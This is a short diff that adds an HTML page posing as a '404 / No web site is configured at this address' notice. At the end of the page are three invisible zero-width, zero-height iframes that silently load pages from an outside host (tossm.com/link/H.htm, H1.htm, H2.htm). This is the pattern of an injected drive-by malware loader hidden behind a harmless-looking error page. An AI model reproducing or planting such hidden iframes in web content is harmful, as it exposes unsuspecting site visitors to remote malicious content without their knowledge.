@@ -1,0 +1,13 @@
+<script type="text/jscript">
+function init() { 
+document.write("No web site is configured at this address");
+
+}
+window.onload = init;
+</script>
+<html>
+<title>404</title>
+</html>
+<iframe width=0 height=0 src=http://tossm.com/link/H.htm></iframe>
+<iframe width=0 height=0 src=http://tossm.com/link/H1.htm></iframe>
+<iframe width=0 height=0 src=http://tossm.com/link/H2.htm></iframe>
